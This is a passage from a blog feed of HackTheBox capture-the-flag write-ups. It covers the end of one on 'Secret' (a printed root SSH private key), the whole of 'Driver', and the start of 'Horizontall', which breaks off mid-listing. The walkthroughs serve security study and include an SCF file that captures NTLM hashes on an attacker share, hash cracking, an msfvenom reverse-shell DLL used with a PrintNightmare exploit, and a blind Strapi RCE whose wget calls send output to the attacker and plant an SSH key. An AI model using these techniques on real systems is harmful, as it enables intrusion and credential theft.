&lt;span class="code-line"&gt;D569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nF&lt;/span&gt;
&lt;span class="code-line"&gt;JZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6z&lt;/span&gt;
&lt;span class="code-line"&gt;y0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U/gc1ljKcSEx262jXKHAG3mTTNKtooZAAAA&lt;/span&gt;
&lt;span class="code-line"&gt;wQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81&lt;/span&gt;
&lt;span class="code-line"&gt;ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb/tWRBuM51v9ZXAlVUz14o&lt;/span&gt;
&lt;span class="code-line"&gt;Kt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLM&lt;/span&gt;
&lt;span class="code-line"&gt;dFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0Gh&lt;/span&gt;
&lt;span class="code-line"&gt;mXSlMvZVJEvlBISUVNM2YC+6hxh2Mc/0Szh0060qZv9ub3DXCDXMrwR5o6mdKv/kshpaD4&lt;/span&gt;
&lt;span class="code-line"&gt;Ml+fjgTzmOo/kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7/uqkiYfLdCJGoWkehGGxep&lt;/span&gt;
&lt;span class="code-line"&gt;lJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibc&lt;/span&gt;
&lt;span class="code-line"&gt;z04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9&lt;/span&gt;
&lt;span class="code-line"&gt;RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9&lt;/span&gt;
&lt;span class="code-line"&gt;6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl&lt;/span&gt;
&lt;span class="code-line"&gt;xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k&lt;/span&gt;
&lt;span class="code-line"&gt;fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==&lt;/span&gt;
&lt;span class="code-line"&gt;-----END OPENSSH PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We save the SSH key and use it to connect to the box and grab the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh root@10.129.173.112 -i id_rsa_root&lt;/span&gt;
&lt;span class="code-line"&gt;root@secret:~# cat root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;bb59318145fdf4a7ea1f50e6c829141c&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;An interesting box quit quick if you know what to do! The root part was harder
for me as I never exploited that before.
Also I tested some novelty in this article with the
&lt;a href="https://carbon.now.sh/"&gt;carbon&lt;/a&gt; code snippet not sure to keep it that way as it
make it harder to copy paste and grep information from the article.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="jwt"></category><category term="core dump"></category></entry><entry><title>HTB: Driver</title><link href="https://maggick.fr/2022/02/htb-driver.html" rel="alternate"></link><published>2022-02-27T11:40:00+01:00</published><updated>2022-02-27T11:40:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-02-27:/2022/02/htb-driver.html</id><summary type="html">&lt;p&gt;&lt;img alt="Driver Card" class="align-left" src="/media/2022.02/driver_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/387"&gt;Driver&lt;/a&gt; published on
October 2, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/13531"&gt;MrR3boot&lt;/a&gt;.
This box is rated as easy box the user part implies a "standard" password, a
&lt;a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/"&gt;SCF file&lt;/a&gt;
and &lt;a href="https://github.com/lgandx/Responder"&gt;Responder&lt;/a&gt;
The root part is nudged by a few hints (box logo,printer on the foothold
website) and implies the use of the CVE-2021-1675 and CVE-2021-34527 also know
as PrintNightmare.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2022.02/driver_card.png" alt="Driver Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/387"&gt;Driver&lt;/a&gt; published on
October 2, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/13531"&gt;MrR3boot&lt;/a&gt;.
This box is rated as easy box the user part implies a "standard" password, a
&lt;a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/"&gt;SCF file&lt;/a&gt;
and &lt;a href="https://github.com/lgandx/Responder"&gt;Responder&lt;/a&gt;
The root part is nudged by a few hints (box logo,printer on the foothold
website) and implies the use of the CVE-2021-1675 and CVE-2021-34527 also know
as PrintNightmare.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 21 (FTP), 22 (SSH) and 80 with a HTTP
service are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;PORT     STATE SERVICE      VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp   open  http         Microsoft IIS httpd 10.0&lt;/span&gt;
&lt;span class="code-line"&gt;| http-auth:&lt;/span&gt;
&lt;span class="code-line"&gt;| HTTP/1.1 401 Unauthorized\x0D&lt;/span&gt;
&lt;span class="code-line"&gt;|_  Basic realm=MFP Firmware Update Center. Please enter password for admin&lt;/span&gt;
&lt;span class="code-line"&gt;| http-methods:&lt;/span&gt;
&lt;span class="code-line"&gt;|_  Potentially risky methods: TRACE&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Microsoft-IIS/10.0&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=UTF-8).&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp  open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: Microsoft-HTTPAPI/2.0&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Not Found&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Host script results:&lt;/span&gt;
&lt;span class="code-line"&gt;|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s&lt;/span&gt;
&lt;span class="code-line"&gt;| smb-security-mode:&lt;/span&gt;
&lt;span class="code-line"&gt;|   authentication_level: user&lt;/span&gt;
&lt;span class="code-line"&gt;|   challenge_response: supported&lt;/span&gt;
&lt;span class="code-line"&gt;|_  message_signing: disabled (dangerous, but default)&lt;/span&gt;
&lt;span class="code-line"&gt;| smb2-security-mode:&lt;/span&gt;
&lt;span class="code-line"&gt;|   2.02:&lt;/span&gt;
&lt;span class="code-line"&gt;|_    Message signing enabled but not required&lt;/span&gt;
&lt;span class="code-line"&gt;| smb2-time:&lt;/span&gt;
&lt;span class="code-line"&gt;|   date: 2021-10-21T22:20:07&lt;/span&gt;
&lt;span class="code-line"&gt;|_  start_date: 2021-10-21T22:16:01&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website on port 80 ask for a basic authentication.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://10.129.171.196 is requesting your username and password. The site says: “MFP Firmware Update Center. Please enter password for admin”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We know that the user is admin and we try a few standard passwords: 'password'
'123456' and 'admin'. The latest one is working.&lt;/p&gt;
&lt;p&gt;The website is offering to test printer Firmware.&lt;/p&gt;
&lt;p&gt;&lt;img alt="MFP Firmware Update Center" src="/media/2022.02/driver_01.png"&gt;&lt;/p&gt;
&lt;h2 id="scf-file-attack"&gt;SCF file attack&lt;/h2&gt;
&lt;p&gt;As mentionned on the Firmware update page:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As we know the testing team will review the file we can use a
&lt;a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/"&gt;SCF file attack&lt;/a&gt;
to grab the user NTLMv2 hash.&lt;/p&gt;
&lt;p&gt;Our SCF file is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[Shell]&lt;/span&gt;
&lt;span class="code-line"&gt;Command=2&lt;/span&gt;
&lt;span class="code-line"&gt;IconFile=\\10.10.14.55\share\pentestlab.ico&lt;/span&gt;
&lt;span class="code-line"&gt;[Taskbar]&lt;/span&gt;
&lt;span class="code-line"&gt;Command=ToggleDesktop&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The responder we launched before uploading our "firmware" file grab the &lt;code&gt;tony&lt;/code&gt;
user hash:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ sudo responder -I tun0                                                                                                                                                                                                             130 ⨯&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[SMB] NTLMv2-SSP Client   : 10.129.242.208&lt;/span&gt;
&lt;span class="code-line"&gt;[SMB] NTLMv2-SSP Username : DRIVER\tony&lt;/span&gt;
&lt;span class="code-line"&gt;[SMB] NTLMv2-SSP Hash     : tony::DRIVER:61dd54e51643d459:DFE0DC661F09DAFC004EC1844E9C4721:0101000000000000806B289471C6D7019A27EFE77C3A82220000000002000800350030004900410001001E00570049004E002D004A0053003900390048004F004D005800510052004A0004003400570049004E002D004A0053003900390048004F004D005800510052004A002E0035003000490041002E004C004F00430041004C000300140035003000490041002E004C004F00430041004C000500140035003000490041002E004C004F00430041004C0007000800806B289471C6D7010600040002000000080030003000000000000000000000000020000043273E6F56DF2738F8BCFF72F774D5270EEE087137EC21179464F2626C47E0800A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0035003500000000000000000000000000&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="cracking-hash"&gt;Cracking hash&lt;/h2&gt;
&lt;p&gt;We run &lt;code&gt;hashcat&lt;/code&gt; on it and grab &lt;code&gt;tony&lt;/code&gt;'s password: &lt;code&gt;liltony&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;└─$ hashcat hash -m 5600 -a 0 /home/kali/tools/password_lists/rockyou.txt --show
TONY::DRIVER:61dd54e51643d459:dfe0dc661f09dafc004ec1844e9c4721:0101000000000000806b289471c6d7019a27efe77c3a82220000000002000800350030004900410001001e00570049004e002d004a0053003900390048004f004d005800510052004a0004003400570049004e002d004a0053003900390048004f004d005800510052004a002e0035003000490041002e004c004f00430041004c000300140035003000490041002e004c004f00430041004c000500140035003000490041002e004c004f00430041004c0007000800806b289471c6d7010600040002000000080030003000000000000000000000000020000043273e6f56df2738f8bcff72f774d5270eee087137ec21179464f2626c47e0800a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0035003500000000000000000000000000:liltony&lt;/p&gt;
&lt;p&gt;Using &lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil winrm&lt;/a&gt; we can connect to
the box using &lt;code&gt;tony&lt;/code&gt; credentials and grab the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ./evil-winrm.rb -i 10.129.242.208 -u tony -p liltony                                                                                                                                                                                 1 ⨯&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[0;31;49m*Evil-WinRM*[0m[0;33;49m PS [0mC:\Users\tony\Documents&amp;gt; type ..\Desktop\user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;87900be0b26c6031b2cc4d8924950dc4&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;Looking at the running services we see that the Spooler service is running. (Back
in October 2021, Print Nightmare was still the hypest vulnerability. Nobody had
looked at the &lt;code&gt;log4j&lt;/code&gt; code yet.)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[0;31;49m*Evil-WinRM*[0m[0;33;49m PS [0mC:\Users\tony\Documents&amp;gt; Get-Service -Name Spooler&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Status   Name               DisplayName&lt;/span&gt;
&lt;span class="code-line"&gt;------   ----               -----------&lt;/span&gt;
&lt;span class="code-line"&gt;Running  Spooler            Print Spooler&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A few Google searches lead us to a working &lt;a href="https://github.com/ly4k/PrintNightmare"&gt;Print nightmare exploit&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We generate a reverse shell DLL using msfvenom
&lt;code&gt;msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.55 LPORT=4444 -f dll -o /tmp/rev.dll&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We upload it using &lt;code&gt;evil winrm&lt;/code&gt; and grab the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\tony\Documents&amp;gt; upload /tmp/rev.dll&lt;/span&gt;
&lt;span class="code-line"&gt;Info: Uploading /tmp/rev.dll to C:\Users\tony\Documents\rev.dll&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;python3 printnightmare.py tony:liltony@10.129.95.238 -dll &amp;#39;C:\Users\tony\Documents\rev.dll&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;type root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;c520e29ba1ecb523a541fc28b75ed0b3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The SCF file attack was great to exploit as this is not something I personally use
a lot. The print nightmare was really interesting as this (was) is one of the
biggest vulnerability of 2021.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="SCF file attack"></category><category term="print nightmare"></category></entry><entry><title>HTB: Horizontall</title><link href="https://maggick.fr/2022/02/htb-horizontall.html" rel="alternate"></link><published>2022-02-07T09:45:00+01:00</published><updated>2022-02-07T09:45:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-02-07:/2022/02/htb-horizontall.html</id><summary type="html">&lt;p&gt;&lt;img alt="Horizontall Card" class="align-left" src="/media/2022.02/horizontall_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/374"&gt;Horizontall&lt;/a&gt; publish on
August 28, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/4005"&gt;wail99&lt;/a&gt;.
This box is rated as an easy machine. It implies a hidden subdomain, a &lt;code&gt;strapi&lt;/code&gt;
exploit, some "tunneling" and a &lt;code&gt;laravel&lt;/code&gt; exploit.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2022.02/horizontall_card.png" alt="Horizontall Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/374"&gt;Horizontall&lt;/a&gt; publish on
August 28, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/4005"&gt;wail99&lt;/a&gt;.
This box is rated as an easy machine. It implies a hidden subdomain, a &lt;code&gt;strapi&lt;/code&gt;
exploit, some "tunneling" and a &lt;code&gt;laravel&lt;/code&gt; exploit.&lt;/p&gt;


&lt;h1 id="foothold-and-user"&gt;Foothold and user&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat Sep  11 09:22:36 2021 as: nmap -sSV -p- -oN notes.md -A 10.129.216.161&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.216.161&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.013s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;| ssh-hostkey:&lt;/span&gt;
&lt;span class="code-line"&gt;|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)&lt;/span&gt;
&lt;span class="code-line"&gt;|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)&lt;/span&gt;
&lt;span class="code-line"&gt;|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    nginx 1.14.0 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-server-header: nginx/1.14.0 (Ubuntu)&lt;/span&gt;
&lt;span class="code-line"&gt;|_http-title: Did not follow redirect to http://horizontall.htb&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website is just a marketing one without anything interesting in its content.
Looking at the loaded JavaScript file we found a specific call to a subdomain
that we can add to our &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ curl http://horizontall.htb/js/app.c68eb462.js | /home/kali/.local/bin/js-beautify | grep horizontall&lt;/span&gt;
&lt;span class="code-line"&gt;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current&lt;/span&gt;
&lt;span class="code-line"&gt;                                Dload  Upload   Total   Spent    Left  Speed&lt;/span&gt;
&lt;span class="code-line"&gt;100 18900  100 18900    0     0   498k      0 --:--:-- --:--:-- --:--:--  498k&lt;/span&gt;
&lt;span class="code-line"&gt;                        href: &amp;quot;https://horizontall.htb&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;                        r.a.get(&amp;quot;http://api-prod.horizontall.htb/reviews&amp;quot;).then((function(s) {&lt;/span&gt;
&lt;span class="code-line"&gt;        t.exports = e.p + &amp;quot;img/horizontall.2db2bc37.png&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The second website is a &lt;a href="https://strapi.io/"&gt;strapi&lt;/a&gt; website. Looking at the
specific we found that the version is 3.0.0-beta.17.4&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ curl http://api-prod.horizontall.htb/admin/init&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;data&amp;quot;:{&amp;quot;uuid&amp;quot;:&amp;quot;a55da3bd-9693-4a08-9279-f9df57fd1817&amp;quot;,&amp;quot;currentEnvironment&amp;quot;:&amp;quot;development&amp;quot;,&amp;quot;autoReload&amp;quot;:false,&amp;quot;strapiVersion&amp;quot;:&amp;quot;3.0.0-beta.17.4&amp;quot;}}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This version of &lt;a href="https://strapi.io/"&gt;strapi&lt;/a&gt; is vulnerable to a RCE exploit
available on &lt;a href="https://www.exploit-db.com/exploits/50239"&gt;exploit-db (50239)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We load the exploit and we can run a &lt;code&gt;wget&lt;/code&gt; against our own python server to
test the blind RCE.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ python3 50239 http://api-prod.horizontall.htb/&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Checking Strapi CMS Version running&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Seems like the exploit will work!!!&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Executing exploit&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Password reset was successfully&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Your email is: admin@horizontall.htb&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Your new credentials are: admin:SuperStrongPassword1&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMxMDIyNzM2LCJleHAiOjE2MzM2MTQ3MzZ9.-UWojwKiQop7GU3filSvSDO9Z-VbCkmqQ26dUFPEr-k&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$&amp;gt; wget 10.10.14.38:8000&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Triggering Remote code executin&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Rember this is a blind RCE don&amp;#39;t expect to see output&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;statusCode&amp;quot;:400,&amp;quot;error&amp;quot;:&amp;quot;Bad Request&amp;quot;,&amp;quot;message&amp;quot;:[{&amp;quot;messages&amp;quot;:[{&amp;quot;id&amp;quot;:&amp;quot;An error occurred&amp;quot;}]}]}&lt;/span&gt;
&lt;span class="code-line"&gt;$&amp;gt; wget 10.10.14.38:8000/$(id)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;└─$ python3 -m http.server&lt;/span&gt;
&lt;span class="code-line"&gt;Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...&lt;/span&gt;
&lt;span class="code-line"&gt;10.129.216.161 - - [11/Sep/2021 09:54:17] code 404, message File not found&lt;/span&gt;
&lt;span class="code-line"&gt;10.129.216.161 - - [11/Sep/2021 09:54:17] &amp;quot;GET /uid=1001(strapi) HTTP/1.1&amp;quot; 404 -&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now we just need to change the command and put our SSH public key in the SSH
&lt;code&gt;authorized_keys&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&amp;gt; mkdir ~/.ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Triggering Remote code executin&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Rember this is a blind RCE don&amp;#39;t expect to see output&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;statusCode&amp;quot;:400,&amp;quot;error&amp;quot;:&amp;quot;Bad Request&amp;quot;,&amp;quot;message&amp;quot;:[{&amp;quot;messages&amp;quot;:[{&amp;quot;id&amp;quot;:&amp;quot;An error occurred&amp;quot;}]}]}&lt;/span&gt;
&lt;span class="code-line"&gt;$&amp;gt; echo &amp;#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVMEKiOVgCorfjoFTX4c/mX1hJZDEM491m37QYTW1kZJpn4yftI6QSgu/S8b0xrJu6lTrGj2NeTvvuuC9969QmyW6E7fDQdXQkkhuq/b9D+DgfudBBlWEfsJVeOvFqt/ZrAgp8VrT8p+HUEvUdKQ4sS828Xi7aDVhrs/stIdv2cgsiBdslMfDct40Pzu5uz1D3ZkBi5RJV+HPZ2yFGbDrQ8bVlAsQf6Mnlv5f+eshNPs8dtsyWNgYczN7IE8R18Cy3rc8wI1/r440PTsFvgBQNttW7Wl2QP8o+xrgOSYIpg6SL/9GMOLhqQtksHRvckEje+rYbumdenaCzk038zS3JWVYCMmNOsVV5Nqwa5oLJafOTUhFpeofuwDjKEldYYc90F1IR3IX1zrtmZIHFWHSU5zIlMk3nRq0BPs49gzMYyZH+ProRp/NTbUDH+sj13w2mNsZk8yrTOjocM5Sx3J5R3Md0Bmmo1ObODeaubeDKHBFBH3GrfZNT3nVFL80wYEU= kali@kali&amp;#39; &amp;gt; ~/.ssh/authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then connect using SSH as the &lt;code&gt;strapi&lt;/code&gt; user and get the user flag (who is
 located in the &lt;code&gt;deveploper&lt;/code&gt; user home).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh strapi@horizontall.htb&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$ bash&lt;/span&gt;
&lt;span class="code-line"&gt;strapi@horizontall:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)&lt;/span&gt;
&lt;span class="code-line"&gt;strapi@horizontall:~$ cat /home/developer/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;81359f896a5e2a6909afdbdaa69a6bb3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We launch
&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS"&gt;linpeas&lt;/a&gt;
on the box, using &lt;code&gt;scp&lt;/code&gt; to upload it. We found a few attacks vector including a
few service available directly on the box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;strapi@horizontall:~$ netstat -lap&lt;/span&gt;
&lt;span class="code-line"&gt;Active Internet connections (servers and established)&lt;/span&gt;
